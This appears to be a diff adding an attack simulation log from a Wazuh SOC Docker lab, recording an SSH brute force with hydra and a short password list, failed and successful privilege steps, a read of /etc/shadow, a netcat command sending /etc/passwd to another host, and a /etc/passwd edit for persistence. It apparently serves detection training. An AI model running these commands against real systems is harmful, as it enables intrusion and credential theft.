@@ -1,0 +1,117 @@
+============================================================
+Attack Simulation Log
+Scenario: SSH Brute Force + Post-Exploitation Actions
+Lab: Wazuh SOC Docker Environment
+Date: 2026-02-16
+Attacker: Kali Linux
+Target: victim-ubuntu (172.17.0.2)
+============================================================
+
+[1] Target IP Identification
+--------------------------------------------
+docker inspect victim-ubuntu | grep IPAddress
+
+Result:
+"IPAddress": "172.17.0.2"
+
+
+[2] Password Wordlist Creation
+--------------------------------------------
+cat > /tmp/passwords.txt << EOF
+password
+123456
+admin
+root
+toor
+ubuntu
+victim
+test123
+EOF
+
+
+[3] SSH Brute Force Attempt
+--------------------------------------------
+hydra -l root -P /tmp/passwords.txt ssh://172.17.0.2
+
+Result:
+0 valid password found
+
+
+[4] Manual SSH Login
+--------------------------------------------
+ssh corentin@172.17.0.2
+
+Login successful.
+
+
+[5] Attempt to Create New User (without sudo)
+--------------------------------------------
+useradd -m attacker
+
+Result:
+Permission denied.
+
+
+[6] Attempt sudo access
+--------------------------------------------
+sudo ls
+
+Result:
+3 incorrect password attempts
+
+
+[7] User creation with sudo
+--------------------------------------------
+sudo useradd -m attacker
+
+
+[8] Attempt to set password
+--------------------------------------------
+passwd attacker
+
+Result:
+You may not view or modify password information.
+
+
+[9] Attempt to switch user
+--------------------------------------------
+su - attacker
+
+Result:
+Authentication failure
+
+
+[10] Shadow file inspection
+--------------------------------------------
+sudo cat /etc/shadow
+
+Entry observed:
+attacker:!:20500:0:99999:7:::
+
+
+[11] Privilege verification
+--------------------------------------------
+sudo whoami
+
+Result:
+root
+
+
+[12] Simulated Data Exfiltration
+--------------------------------------------
+nc 172.17.0.1 4444 < /etc/passwd
+
+
+[13] Persistence Simulation
+--------------------------------------------
+sudo nano /etc/passwd
+
+
+[14] Session Termination
+--------------------------------------------
+exit
+Connection closed.
+
+============================================================
+End of Attack Log
+============================================================
